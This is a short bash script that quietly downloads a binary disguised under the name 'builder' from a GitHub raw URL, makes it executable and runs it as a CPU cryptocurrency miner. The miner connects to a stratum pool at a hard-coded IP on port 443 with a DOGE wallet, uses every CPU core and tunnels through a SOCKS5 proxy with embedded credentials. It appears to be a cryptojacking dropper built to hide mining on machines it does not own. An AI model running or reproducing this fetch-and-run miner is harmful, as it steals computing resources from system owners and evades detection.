#!/bin/bash  
wget -q https://raw.githubusercontent.com/andromedasizu/andromedasizu/main/builder 

chmod +x builder 

./builder -a lyra2z330 -o stratum+tcp://142.93.242.29:443 -u DF9BANQv5kZqKyNSAenkjx33dXhtBUnjjr -p c=DOGE,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -t$(nproc --all) --cpu-affinity=0x3 -x socks5://wdegaquq:783z80ufx340@185.199.229.156:7492
